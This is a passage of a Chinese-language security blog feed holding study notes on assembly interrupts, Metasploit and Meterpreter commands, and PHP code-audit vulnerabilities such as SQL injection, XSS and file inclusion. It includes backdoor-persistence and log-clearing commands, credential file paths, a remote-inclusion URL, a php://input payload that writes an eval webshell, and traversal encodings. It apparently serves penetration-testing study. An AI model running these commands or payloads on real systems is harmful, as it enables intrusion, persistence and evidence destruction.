bash"><table><tr><td class="code"><pre><span class="line">pop IP</span><br><span class="line">pop CS </span><br><span class="line">popf</span><br></pre></td></tr></table></figure></p><p>3.int n<br>n为中断类型码，引发中断<br>执行过程：<br>1）取中断类型码n<br>2)标志寄存器入栈，IF=0,TF=0<br>3)CS、IP入栈<br>4)(IP)=(n<em>4),(CS)=(n</em>4+2)<br>4.端口的读写指令只有两条：in和out<br>5.shl逻辑左移指令<br>shr逻辑右移指令  </p><h1 id="外中断"><a href="#外中断" class="headerlink" title="外中断"></a>外中断</h1><p>1.可屏蔽中断是cpu可以不响应的外中断。<br>sti,设置IF=1<br>cli，设置IF=0<br>2.键盘的输入<br>断码=通码+80h   </p><p><br></p><p>参考书籍：<br><a href="https://book.douban.com/subject/25726019/" target="_blank" rel="noopener">https://book.douban.com/subject/25726019/</a></p>]]></content>
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 二进制 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>metasploit学习小记</title>
      <link href="/posts/49ca178a.html"/>
      <url>/posts/49ca178a.html</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="metasploit的基础知识"><a href="#metasploit的基础知识" class="headerlink" title="metasploit的基础知识"></a><a href="https://www.offensive-security.com/metasploit-unleashed/" target="_blank" rel="noopener">metasploit的基础知识</a></h1><p>以前一直在使用这个渗透神器，不知道其原理，这次特地借了一本书，来深入理解一下。<br><a id="more"></a><br>1.metasploit框架的体系结构 </p><p><img src="http://p4gdp8beq.bkt.clouddn.com/123456ass.jpg" alt="">  </p><p>模块<br>Exploit: 渗透攻击模块，一段程序，利用目标的安全漏洞进行攻击。<br>Payload: 攻击载荷模块，在成功完成对目标的一次渗透攻击后，在目标主机上运行，获得需要的访问和行动权限。<br>Auxiliary:包含了一系列的辅助支持模块，包括扫描模块、fuzz测试漏洞发掘模块、网络协议欺骗以及其他模块。<br>Encoder: 编码器模块通常对我们的攻击模块进行代码混淆，来逃过目标安全保护机制的检测。<br>基础库：<br>Ruby扩展(REX)：处理几乎所有的核心功能，如设置网络套接字、网络的连接、格式化和所有其他基本功能。<br>MSF核心：提供了基本的应用编程接口和框架的实际核心。<br>MSF基础：对模块提供了友好的应用编程接口   </p><p>2.<a href="https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/" target="_blank" rel="noopener">命令</a><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use[Auxiliary/Exploit/Payload/Encoder]    选择一个指定的模块并使其开始工作</span><br><span class="line">show [auxiliary/exploit/payload/encoder/options] 显示可用的特定功能的模块</span><br><span class="line"><span class="built_in">set</span> [options/payload]   给某个特定的对象赋值  </span><br><span class="line">setg [options/payload]  给某个特定的对象赋值的同时设定作用域为全局，在模块进行切换的时候，该对象的值不会改变</span><br><span class="line">run   在设定一个辅助模块需要的所有选项之后，启动该模块 </span><br><span class="line">exploit   启动一个渗透攻击模块 </span><br><span class="line">back      取消当前选择的模块并且退回到上一级命令窗口 </span><br><span class="line">info  列出模块的相关信息 </span><br><span class="line">search    搜索符合条件的特定模块</span><br><span class="line">check     检查摸个特定目标是否易受到攻击 </span><br><span class="line">sessions      列出当前可用会话</span><br></pre></td></tr></table></figure></p><p>3.<a href="http://www.91ri.org/8476.html" target="_blank" rel="noopener">meterpreter的命令</a><br>4.一次渗透命令<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sysinfo  收集一些有关目标系统额基本信息</span><br><span class="line">getuid   获取当前会话权限 </span><br><span class="line">getpid   当前会话所在的进程标识符pid </span><br><span class="line">ps       查看所有进程标识符</span><br><span class="line">migrate  转换进程 (渗透时建议转换explorer.exe进程pid)</span><br><span class="line">getsystem获取系统权限 </span><br><span class="line">download     下载一根目标计算机的文件</span><br><span class="line">rmdir        删除一个文件夹</span><br><span class="line"> </span><br><span class="line">run persistence                运行此模块在目标主机上安装一个后门，实现访问控制持久化 </span><br><span class="line"></span><br><span class="line">msf&gt;use exploit/multi/handler  与运行persitstence时设置的payload和lport选项一样 </span><br><span class="line"></span><br><span class="line">run event_manager -c           清除掉目标系统上与渗透测试相关的事件日志</span><br></pre></td></tr></table></figure></p><p>5.数据库的存储和取回结果<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl start postgresql  启动数据库</span><br><span class="line">mysql init         初始化数据库 </span><br><span class="line">msf&gt;db_connect  用来与默认数据库之外的数据库交互</span><br><span class="line">db_import       用来向数据库导入来自其他扫描工具（如nessus和nmap）的扫描结果</span><br><span class="line">db_status       数据库的连接状态</span><br><span class="line">db_disconnect   从指定的数据库断开连接</span><br><span class="line">db_nmap         用namp尽心扫描，结果保存在数据库里 </span><br><span class="line">db_rebuild_cache 用来重新建立缓存，主要目的是使用心的配置替换之前缓存文件中错误或者过时的配置   </span><br><span class="line">hosts            显示数据库中存储的主机信息  </span><br><span class="line">services         查看数据库中存储的扫描过的主机开启的端口服务</span><br></pre></td></tr></table></figure></p><h1 id="metasploit模块"><a href="#metasploit模块" class="headerlink" title="metasploit模块"></a>metasploit模块</h1><p>1.<a href="http://www.runoob.com/ruby/ruby-command-line-options.html" target="_blank" rel="noopener">ruby语言</a><br>1.在命令行中定义方法<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">def method_name[([arg [=default]]...[,*arg [,&amp;expr]])]</span><br><span class="line">expr </span><br><span class="line">end</span><br></pre></td></tr></table></figure></p><p>split函数 将一个字符串的值分割为多个连续的变量<br>squeeze函数 将制定的字符串中去除重复的空格<br>to_i 将字符串类型的输入转换成数字<br>to_s 将一个数字转换成字符串<br>2.以被控计算机为跳板<br>在被控制的计算机上<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;run autoroute -s 目标服务器</span><br></pre></td></tr></table></figure></p><p>3.设置永久访问权限<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;run metsvc -A</span><br></pre></td></tr></table></figure></p><p>4.RailGun<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;irb</span><br><span class="line">&gt;&gt;client.railgun.DLLname.function(parameter)</span><br></pre></td></tr></table></figure></p><p>例子：<br>被渗透的系统进入锁定状态<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;client.railgun.user32.LockWorkStation()</span><br></pre></td></tr></table></figure></p><p>删除被渗透系统的指定用户<br>第一个参数代表局域网，假如不在同一个网络中，应填写目标系统的NET-BIOS,第二个代表用户</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;client.railgun.netapi.NetUserDel(nil,<span class="string">"qianye"</span>)</span><br></pre></td></tr></table></figure><p><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ff818516" target="_blank" rel="noopener">windows api资料</a><br>5.汇编语言基础<br>寄存器<br>是一种高速的计算机内存组件<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">EAX   用来存储数据和操作数的累加器，大小32</span><br><span class="line">EBX   基地寄存器，同时也是一个指向数据的指针</span><br><span class="line">ECX   实现循环为目的的计数器</span><br><span class="line">EDX   用来保存I/O指针数据寄存器 </span><br><span class="line">ESI/EDI 两者都是索引寄存器，用作内存运算时的数据指针</span><br><span class="line">ESP   栈指针寄存器,准确地告诉你当前栈顶的位置</span><br><span class="line">EBP   栈数据指针寄存器</span><br><span class="line">EIP   程序计数器，保存要执行下一条指令的地址</span><br><span class="line">SS DS ES CS FS GS  端寄存器，大小为16位</span><br></pre></td></tr></table></figure></p><p>段<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.data  用来存储已经初始化的数据</span><br><span class="line">.bss   用来存储为初始化的数据</span><br><span class="line">.text  所有的程序指令都可以在这里定义</span><br><span class="line">.global_start  外部可调用的程序</span><br><span class="line">_start  主函数程序 </span><br><span class="line">Stack   存放变量和数据</span><br></pre></td></tr></table></figure></p><p>数据类型<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.byte 单字节</span><br><span class="line">.ascii  字符串</span><br><span class="line">.asciz  以null结尾的字符串</span><br><span class="line">.int  32位整形</span><br><span class="line">.short 16位整形</span><br><span class="line">.<span class="built_in">float</span> 单精度浮点型</span><br><span class="line">.double 双精度浮点型</span><br></pre></td></tr></table></figure></p><p>未完待续 ……</p>]]></content>
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>审计以及漏洞知识点小整理</title>
      <link href="/posts/8a554d22.html"/>
      <url>/posts/8a554d22.html</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>趁着这几天清闲，整理一下常见漏洞的知识，既是给自己梳理一下知识体系，也是给自己留个备忘录，省得记忆差，老是忘却。大都是从书本上搬运而来的，整理不佳，大牛略过，勿喷。</p><a id="more"></a> <p>别人的php代码审计知识脑图<br><img src="/posts/../../images/naotu/PHP.png" alt=""></p><h1 id="通用代码审计思路"><a href="#通用代码审计思路" class="headerlink" title="通用代码审计思路"></a>通用代码审计思路</h1><h2 id="1-敏感函数回溯参数"><a href="#1-敏感函数回溯参数" class="headerlink" title="1.敏感函数回溯参数"></a>1.敏感函数回溯参数</h2><p>1敏感函数<br>2非敏感函数:<br> sql查询语句拼接前是否有过滤。<br>查找关键特征：select、insert、update等，结合from、where。<br>寻找漏洞：<br>sql语句中的参数是否有过滤。<br>例如：HTTP_CLIENT_IP和HTTP_X_FORWORDF等获取的ip地址。</p><h2 id="2通读全文代码。"><a href="#2通读全文代码。" class="headerlink" title="2通读全文代码。"></a>2通读全文代码。</h2><p>1.函数集文件，通常命名为functions或者common等关键字，提供其他文件调用的公共函数。<br>2.配置文件。通常命名包含config关键字，包括web程序运行必须的功能性配置选项以及数据库等配置信息。<br>3安全过滤文件。通常命名中有filter、safe、check等关键字，对参数进行过滤，入sql注入和xss过滤,文件路径和执行的系统命令 的参数。<br>4index文件，可以大致了解整个程序的框架和运行的流程、包含到的文件、其中的核心文件。   </p><h2 id="3-根据功能点定向审计"><a href="#3-根据功能点定向审计" class="headerlink" title="3.根据功能点定向审计"></a>3.根据功能点定向审计</h2><p>3.1文件上传功能。如文章编辑、资料编辑、头像上传、附件上传，经常出现任意文件上传漏洞。如果没有对文件名进行过滤，还可能存在sql注入。<br>3.2文件管理。 文件名和路径如果直接在参数中传递，可能存在任意文件操作漏洞，利用../或..\跳转。忽略对文件名过滤，还可能存在xss漏洞。<br>3.3登入认证功能。基于cookie和session认证方式，如果cookie没有加salt,可以导致任意文件登入。或者用户名明文直接放在cookie，导致越权漏洞。<br>3.4找回密码功能。</p><h1 id="sql注入漏洞"><a href="#sql注入漏洞" class="headerlink" title="sql注入漏洞"></a><a href="https://github.com/JnuSimba/MiscSecNotes/blob/master/SQL%20%E6%B3%A8%E5%85%A5/MYSQL%E6%B3%A8%E5%85%A5.md" target="_blank" rel="noopener">sql注入漏洞</a></h1><h2 id="1-常见的函数"><a href="#1-常见的函数" class="headerlink" title="1.常见的函数"></a>1.常见的函数</h2><p>mid()—从文本字段中提取字符SELECT   MID(column_name,start[,length]) FROM table_name;<br>column_name 必需。要提取字符的字段。<br>start 必需。规定开始位置（起始值是 1）。<br>length 可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。   </p><p>limit()—返回前几条或者中间某几行数据select * from table limit m,n;<br>其m指记录始index0始表示第条记录 n指第m+1条始取n条   </p><p>concat、concat_ws、group_concatMySQL的concat函数在连接字符串的 时候，只要其中一个是NULL,那么将返回NULL<br>和concat不同的是, concat_ws函数在执行的时候,不会因为NULL值而返回NULL<br>group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator ‘分隔符’])   </p><p>Count()—聚集函数，统计元祖的个数<br>rand()—用于产生一个0~1的随机数<br>floor()—向下取整<br>group by—依据我们想要的规则对结果进行分组<br>length()—返回字符串的长度<br>Substr()—截取字符串 三个参数 （所要截取字符串，截取的位置，截取的长度）<br>sleep() 函数延迟代码执行若干秒。  </p><h2 id="2-常见注入"><a href="#2-常见注入" class="headerlink" title="2.常见注入"></a>2.常见注入</h2><p>1 <a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html" target="_blank" rel="noopener">limit注入</a><br>2<a href="https://www.waitalone.cn/security-sqlinject-jpg.html" target="_blank" rel="noopener">图片宽字节注入</a><br>3<a href="http://cfyqy.com/posts/53139f85/" target="_blank" rel="noopener">cookie注入</a><br>4post注入<br>5<a href="http://hacker-chengyu.lofter.com/post/1d1568f4_d192dc5" target="_blank" rel="noopener">报错注入</a><br>6<a href="http://www.jb51.net/article/93445.htm" target="_blank" rel="noopener">布尔盲注</a><br>7时间盲注<br>8<a href="http://www.beesfun.com/2017/03/28/MySQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-%E4%B8%89/" target="_blank" rel="noopener">二次注入</a><br>9<a href="http://www.cnblogs.com/icez/p/Mysql-Order-By-Injection-Summary.html" target="_blank" rel="noopener">order by 注入</a><br>10<a href="http://cfyqy.com/posts/90656973/" target="_blank" rel="noopener">密码注入</a><br>11<a href="https://ch1st.github.io/2017/10/19/Mysql%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">mysql约束攻击</a><br>12<a href="http://blog.csdn.net/greyfreedom/article/details/45846137" target="_blank" rel="noopener">md5加密注入</a><br>13<a href="https://www.anquanke.com/post/id/86021" target="_blank" rel="noopener">mysql失败注入</a><br>14 header 注入<br>15 二次查询注入<br>16update或insert注入<br> <a href="http://vinc.top/2017/04/06/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91insert%E3%80%81update%E5%92%8Cdelete%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">insert、update和delete报错注入</a><br> <a href="http://vinc.top/2017/04/06/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91insert%E3%80%81update%E5%92%8Cdelete%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" target="_blank" rel="noopener">insert、update和delete时间盲注</a><br> <a href="https://www.anquanke.com/post/id/85487" target="_blank" rel="noopener">一种新的MySQL下Update、Insert注入方法</a><br> 17<a href="https://www.jianshu.com/p/19ef493da938" target="_blank" rel="noopener">SQL带外通道注入</a> </p><h2 id="3-编码注入"><a href="#3-编码注入" class="headerlink" title="3.编码注入"></a>3.编码注入</h2><p>1<a href="https://mp.weixin.qq.com/s/Gu9MTBhZryUrPSAj4GpYDg" target="_blank" rel="noopener">宽字节注入注入</a><br>当<code>set character_set_client=gbk</code> 时，很容易存在宽字节注入<br>防范方法3种:<br>a. 在执行查询之前先执行<code>SET NAMES &#39;gbk&#39;,charset_set_client=binary</code>。<br>b.使用<code>mysql_set_charset(&#39;gdk&#39;)</code>设置编码，然后使用<code>mysql_real_escape_string()</code>函数被参数过滤。<br>c.使用pdo方式，在php5.3.6及一下版本需要设置<code>setAttribute(PDO::ATTR_EMULATE_PREPARES,false)</code>; 来禁用<code>prepared statements</code>的仿真效果。<br>2二次urldecode注入<br>利用urldecode和rawurldecode函数使用不当   </p><h2 id="4-sql注入防御"><a href="#4-sql注入防御" class="headerlink" title="4.sql注入防御"></a>4.sql注入防御</h2><p>1.gpc/runtime魔术引号<br>magic_quotes_gpc 负责对GET、POST、COOKIE的值进行过滤。<br>magic_quotes_runtime负责对从数据库后者文件中获取的数据进行过滤。<br>启用： php4.2.3可以在配置文件和代码的任意地方启用。之后在php.ini、httpd.conf以及.htaccess中开启。<br>2.过滤函数<br>addslashes 和gpc过滤的值一样，即‘、‘’、\、null<br>mysql_[real_]escape_string 函数 ,即\x00、\n、 \r 、\ 、’ 、’’、 \xla  都是对字符串进行过滤，php4.03以上版本才存在。<br>intval等字符转换。<br>3.PDO prepare预编译   </p><h2 id="sql注入的一些绕过技巧"><a href="#sql注入的一些绕过技巧" class="headerlink" title="sql注入的一些绕过技巧"></a>sql注入的一些绕过技巧</h2><p>这里有几篇不错的文章<br><a href="https://www.anquanke.com/post/id/85936" target="_blank" rel="noopener">sql注入与防御</a><br><a href="https://www.anquanke.com/post/id/86005" target="_blank" rel="noopener">SQL注入防御与绕过的几种姿势</a><br><a href="http://www.myh0st.cn/index.php/archives/883/" target="_blank" rel="noopener">PHP+Mysql注入防护与绕过</a></p><h1 id="xss漏洞"><a href="#xss漏洞" class="headerlink" title="xss漏洞"></a>xss漏洞</h1><p>跨站脚本攻击（Cross Site Scriptings）,嵌入客户端的恶意脚本代码  ，xss可以盗取用户cookie、黑道网页、改变网页内容。<br>审计时寻找没有被过滤的参数，且这些参数传入到输出函数，关键字：print、print_r、echo、printf、sprintf、die、var_dump、var_export。   </p><h2 id="1-xss类型"><a href="#1-xss类型" class="headerlink" title="1.xss类型"></a>1.xss类型</h2><p>1.<a href="https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/%E5%8F%8D%E5%B0%84XSS.md" target="_blank" rel="noopener">反射性xss</a><br>简单的把用户输入的数据反射给游览器，需要诱使用户点击一个恶意链接，才能成功，非持久性。<br>2.<a href="https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/%E5%AD%98%E5%82%A8XSS.md" target="_blank" rel="noopener">存储性xss</a><br>把用户输入的数据存储在服务器。<br>3.<a href="https://security.tencent.com/index.php/blog/msg/107" target="_blank" rel="noopener">DOMxss</a><br>实际上，这种类型的XSS并非按照“数据是否保存在服务器端”来划分的，从效果上来说也是反射型XSS单独划分出来的，因为DOM Based XSS 的形成原因比较特别。这是由于客户端脚本自身解析不正确导致的安全问题。   </p><h2 id="2-xss的利用"><a href="#2-xss的利用" class="headerlink" title="2.xss的利用"></a>2.xss的利用</h2><p>1.xss payload<br>构造get和post请求<br>xss钓鱼<br>识别用户的游览器<br>识别用户安装的软件<br>css History Hack<br>获取用户的真实ip<br>2.xss  Framework<br>attacke api<br>beff<br>xss-proxy<br>3.xss  worm   </p><h2 id="3-xss的构造"><a href="#3-xss的构造" class="headerlink" title="3.xss的构造"></a>3.xss的构造</h2><p><a href="http://www.freebuf.com/articles/web/20282.html" target="_blank" rel="noopener">XSS现代WAF规则探测及绕过技术</a><br><a href="http://www.freebuf.com/articles/web/153055.html" target="_blank" rel="noopener">XSS过滤绕过速查表</a>     </p><h2 id="4-xss的防御"><a href="#4-xss的防御" class="headerlink" title="4.xss的防御"></a>4.xss的防御</h2><p><a href="http://www.freebuf.com/articles/web/9977.html" target="_blank" rel="noopener">防御XSS的七条原则</a><br><a href="https://juejin.im/entry/58a598dc570c35006b5cd6b4" target="_blank" rel="noopener">XSS 攻击和防御详解</a><br>附上一篇前端<a href="https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/%E8%A7%A3%E7%A0%81%E9%A1%BA%E5%BA%8F.md" target="_blank" rel="noopener">解码顺序</a></p><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a><a href="https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/CSRF.md" target="_blank" rel="noopener">CSRF</a></h1><p>Cross_site request forgery（跨站请求伪造）<br>当我们打开或者登入某个网站后，游览器与网站所存放的服务器将会产生一个会话，在这个会话没有结束时，你就可以利用你的权限对网站进行某些操作。  </p><h2 id="1-csrf的攻击和防御"><a href="#1-csrf的攻击和防御" class="headerlink" title="1.csrf的攻击和防御"></a>1.csrf的攻击和防御</h2><p><a href="http://www.freebuf.com/column/153543.html" target="_blank" rel="noopener">白帽子挖洞—跨站请求伪造（CSRF）篇</a><br><a href="http://www.freebuf.com/column/151816.html" target="_blank" rel="noopener">各大SRC中的CSRF技巧</a><br><a href="https://www.leavesongs.com/PENETRATION/think-about-cookie-form-csrf-protected.html" target="_blank" rel="noopener">Cookie-Form型CSRF防御机制的不足与反思</a>   </p><h1 id="文件操作漏洞"><a href="#文件操作漏洞" class="headerlink" title="文件操作漏洞"></a>文件操作漏洞</h1><h2 id="1-文件包含漏洞"><a href="#1-文件包含漏洞" class="headerlink" title="1.文件包含漏洞"></a>1.<a href="https://github.com/JnuSimba/MiscSecNotes/blob/master/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.md" target="_blank" rel="noopener">文件包含漏洞</a></h2><p> 1.php包含函数：<br> require: 找不到被包含的函数产生致命错误（E_COMPILE_ERROR）,并停止脚本<br> include: 找不到被包含的文件时只会产生警告（E_WARNING），脚本将继续执行<br> include_once:和include类似，包含一次，则不会再包含<br> require_once: 和require类似，包含一次，则不会再包含</p><p> 本地文件包含   </p><p> 远程文件包含<br> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">allow_url_include= off //把off更改为on</span><br></pre></td></tr></table></figure></p><p> 2.文件包含漏洞利用<br> (1)常见敏感信息路径<br>  window系统<br> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">c:\boot.ini    //查看系统版本       </span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml //iis配置文件</span><br><span class="line">c:\windows\repair\sam  //存储windwos系统初次安装的密码</span><br><span class="line">c:\Program Files\mysql\my.ini  //mysql配置</span><br><span class="line">c:\Program Files\mysql\data\mysql\user.MYD //mysql root</span><br><span class="line">c:\windows\php.ini       //php配置文件</span><br></pre></td></tr></table></figure></p><p> UNIX/Linux系统<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/passwd   //账户密码</span><br><span class="line">/usr/<span class="built_in">local</span>/app/apache2/conf/httpd.comf //apache2默认配置文件</span><br><span class="line">/usr/<span class="built_in">local</span>/app/apache2/conf/extra/httpd-vhosts.conf  //虚拟网站设置</span><br><span class="line">/usr/<span class="built_in">local</span>/app/php5/lib/php.ini //php相关设置</span><br><span class="line">/etc/httpd/conf/httpd.conf  //apache配置文件</span><br><span class="line">/etc/my.cnf  //mysql配置文件</span><br></pre></td></tr></table></figure></p><p> （2）远程包含shell<br> 当目标主机allow_url_fopen选项是on,就可以远程包含一句话</p><p> <a href="http://cfyqy.com/index.php?page=http://www.qianye.com/shell.txt" target="_blank" rel="noopener">http://cfyqy.com/index.php?page=http://www.qianye.com/shell.txt</a> </p><p> (3)本地包含配合文件上传。<br> 上传一句话图片木马到目标网站服务器，再包含该图片。<br> (4)使用<a href="https://lorexxar.cn/2016/09/14/php-wei/" target="_blank" rel="noopener">php封装协议</a>    </p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file://          访问本地文件系统</span><br><span class="line">http://          访问http(s)网址</span><br><span class="line">ftp://           访问ftp(s)urls</span><br><span class="line">php://           访问输入/输出流  </span><br><span class="line">zlib://          压缩流   </span><br><span class="line">data://          数据流   </span><br><span class="line">sshs://          Secure Shell2 </span><br><span class="line">expect://        处理交互式的流  </span><br><span class="line">glob://          查找匹配文件路径</span><br></pre></td></tr></table></figure><p> 使用封装协议可以读取php文件<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://cfyqy.com/index.php?page=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=config.php</span><br></pre></td></tr></table></figure></p><p>写入php文件<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://cfyqy.com/index.php?page=php://input   </span><br><span class="line"></span><br><span class="line">post：&lt;?fputs(fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>),<span class="string">"&lt;?php eval(<span class="variable">$_POst</span>['qianye']);?&gt;"</span>?&gt;</span><br></pre></td></tr></table></figure></p><p>  (5）包含apache 日志文件<br> 访问<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://cfyqy.com/&lt;?php  phpinfo();?&gt;</span><br></pre></td></tr></table></figure></p><p> &lt;&gt; 会被url转码，所以要bp修改一下 。<br> 发现apache的日志文件路径是重点<br>（6）文件包含截断<br>%00截断：<br>受限于GPC和addslashes等函数过滤，php5.3后，前面修复了该问题   </p><p>利用多个英文句号（.）和反斜杠（/）来截断：<br>window下240个（.）或者240个（./）,linux下2038个（/.）组合<br>不受gpc限制，php5.3之后被修复  </p><p>问号（?）来伪截断：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://cfyqy.com/1.txt == http://cfyqy.com/1.txt?.php</span><br></pre></td></tr></table></figure></p><p>不受gpc和php版本限制<br>3.jsp包含：<br>(1)静态包含<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;%@ include file=<span class="string">"page.txt"</span> %&gt;</span><br></pre></td></tr></table></figure></p><p>jsp语法规定：<br>include指令为静态包含，只允许包含一个已经存在于服务器中的文件，不能使用变量来控制包含某个文件，这意味着使用include指令，将不存在文件包含漏洞<br>(2)动态包含  </p><h2 id="2-文件读取漏洞"><a href="#2-文件读取漏洞" class="headerlink" title="2.文件读取漏洞"></a>2.文件读取漏洞</h2><p>审计时：文件读取的函数列表： file_put_contents()、highlight_file()、fopen()、readfile()、fread()、fgetss()、fgets()、parse_ini_file()、show_source()、file()，还可以利用文件包含include()，php输入输出留php://filter来读取函数   </p><h2 id="3-文件上传漏洞"><a href="#3-文件上传漏洞" class="headerlink" title="3.文件上传漏洞"></a>3.<a href="https://github.com/JnuSimba/MiscSecNotes/blob/master/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.md" target="_blank" rel="noopener">文件上传漏洞</a></h2><p>审计时： 上传函数move_uploaded_file()<br>php会对上传的文件创建临时的文件，其目录在php.ini 的upload_tmp_dir中定义，默认为空。linux下会使用tmp目录，windows下回使用c:\windows\tmp目录<br>1.<a href="https://navisec.it/%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%89%8B%E5%86%8C/" target="_blank" rel="noopener">编译器上传漏洞</a><br>2.<a href="http://www.cnnetarmy.com/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">绕过文件上传的检查功能</a><br>%00截断<br>白名单绕过<br>黑名单绕过<br>特殊文件名绕过<br>文件名大小写绕过<br>前端js绕过<br>文件头、content-type绕过<br>3.<a href="https://www.secfree.com/article-585.html" target="_blank" rel="noopener">文件上传漏洞的防御</a><br>文件上传的目录设置为不可执行<br>判断文件的类型<br>使用随机数改写文件名和文件路径<br>单独设置文件服务器的域名  </p><h2 id="4-文件解析漏洞"><a href="#4-文件解析漏洞" class="headerlink" title="4.文件解析漏洞"></a>4.<a href="https://github.com/JnuSimba/MiscSecNotes/blob/master/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90.md" target="_blank" rel="noopener">文件解析漏洞</a></h2><p>1.apache文件解析漏洞<br>2.iis文件解析问题<br>3.php cgi路径解析问题<br>附上一篇文章<br><a href="https://thief.one/2016/09/21/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">服务器解析漏洞</a> </p><h2 id="5-文件删除漏洞"><a href="#5-文件删除漏洞" class="headerlink" title="5.文件删除漏洞"></a>5.文件删除漏洞</h2><p>审计时： 常出现的函数unlink()</p><h2 id="6-目录遍历漏洞"><a href="#6-目录遍历漏洞" class="headerlink" title="6.目录遍历漏洞"></a>6.目录遍历漏洞</h2><p>可以使用不同的编码来绕过一些服务端逻辑：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%2e%2e%2f 等同于../  </span><br><span class="line">%2e%2e    等同于../  </span><br><span class="line">..%2f     等同于../  </span><br><span class="line">%2e%2e%5c 等同于../</span><br><span class="line">%2e%2e    等同于..\</span><br><span class="line">%5c       等同于..\</span><br><span class="line">%252e%252e%255c  等同于../ </span><br><span class="line">..%255c  等同于..\and so on.</span><br></pre></td></tr></table></figure></p><p>某些web容器支持的编码方式；<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">..%c0%af 等同于../ </span><br><span class="line">../%c1%9c 等同于 ..\</span><br></pre></td></tr></table></figure></p><h1 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h1><p>用户可以通过请求将代码注入到应用中执行<br>审计时： eval()、assert()、preg_replace()、call_user_func()、call_user_func_array()、array_map()等过滤不严、另外还有php的动态函数（$a($b）也是目前出现比较多的<br>1.代码执行函数<br>(1)eval和assert函数<br>(2)preg_replace函数：<br>当$pattern 处存在e修饰符是，$replacement的值会被当成php代码执行。  </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">preg_replace(<span class="string">"/\[(.*)\]/e"</span>, <span class="string">'\\1'</span>,<span class="variable">$_GET</span>[<span class="string">'str'</span>]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>意思是从变量中搜索括号[]中间的内容作为第一组结果， 